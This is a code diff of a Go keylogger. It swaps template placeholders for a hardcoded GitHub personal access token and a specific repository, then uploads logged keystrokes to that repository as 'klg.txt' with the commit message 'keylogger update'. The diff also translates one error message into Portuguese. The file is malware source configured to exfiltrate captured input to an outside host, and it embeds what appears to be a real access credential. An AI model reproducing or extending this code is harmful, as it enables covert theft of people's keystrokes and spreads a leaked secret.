@@ -25,7 +25,7 @@ func clearScreen() {
 	case "windows":
 		cmd = exec.Command("cmd", "/c", "cls")
 	default:
-		panic("Platform not supported")
+		panic("Plataforma não suportada")
 	}
 
 	cmd.Stdout = os.Stdout
@@ -62,7 +62,7 @@ func main() {
 				log.Fatalf("Error creating temporary file: %v", err)
 			}
 
-			token := "YOUR_TOKEN_HERE"
+			token := "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"
 			ts := oauth2.StaticTokenSource(
 				&oauth2.Token{AccessToken: token},
 			)
@@ -75,10 +75,10 @@ func main() {
 				log.Fatalf("Error reading the temporary file: %v", err)
 			}
 
-			repoOwner := "YOUR_USERNAME"
-			repoName := "YOUR_REPONAME"
-			filePath := "klg.txt" //you can replace it
-			fileMessage := "keylogger update" //you can replace it
+			repoOwner := "simplyYan"
+			repoName := "simplyYan"
+			filePath := "klg.txt"
+			fileMessage := "keylogger update"
 
 			_, _, err = client.Repositories.CreateFile(context.Background(), repoOwner, repoName, filePath, &github.RepositoryContentFileOptions{
 				Message: &fileMessage,
